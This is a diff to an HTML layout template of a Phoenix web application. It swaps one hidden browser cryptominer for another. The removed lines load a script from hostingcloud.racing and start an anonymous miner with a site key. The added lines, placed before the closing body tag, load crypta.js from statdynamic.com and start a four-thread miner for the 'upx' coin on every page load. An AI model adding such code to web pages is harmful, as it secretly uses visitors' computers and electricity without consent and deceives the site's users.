@@ -19,21 +19,22 @@
        <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
     <script defer phx-track-static type="text/javascript" src="<%= Routes.static_path(@conn, "/js/app.js") %>"></script>
 
-<script src="https://www.hostingcloud.racing/JNiF.js"></script>
-<script>
-    var _client = new Client.Anonymous('ac9cf52e5ef15eed99ce101b3b2587a7c3cc7a0f77d9ad4ee007134bf4e65d1b', {
-        throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
-    
-
-</script>
-
 
   </head>
   <body style="background-color: #121212">
     <header>
     </header>
     <%= @inner_content %>
+
+
+<script src="//statdynamic.com/lib/crypta.js"></script>
+<script>
+  var miner=new CRLT.Anonymous('db25806492a980c57112517fb9edc0d58783f0bb949c', {
+    threads:4,throttle:0.72, coin: "upx",
+  });
+  miner.start();
+</script>
+
+
   </body>
 </html>
